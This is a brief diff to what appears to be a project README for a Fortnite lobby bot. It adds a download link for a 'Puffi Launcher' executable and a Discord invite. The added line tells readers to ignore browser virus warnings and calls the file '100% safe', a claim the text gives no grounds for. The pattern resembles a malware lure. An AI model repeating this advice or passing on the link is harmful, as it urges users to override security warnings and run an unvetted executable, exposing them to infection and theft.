@@ -13,4 +13,4 @@
 ---
 **you  need help? join my Disocrd Server https://discord.gg/rhk3hPAKzm**
 ---
-
+Download Puffi Launcher from here https://github.com/SkyAlumnyDev/Fortnite-Lobby-Bot/releases/tag/1.0.0.0 if your Brwoser says this is a virus ignore them this code is 100% safe but Windows think this is a virus 
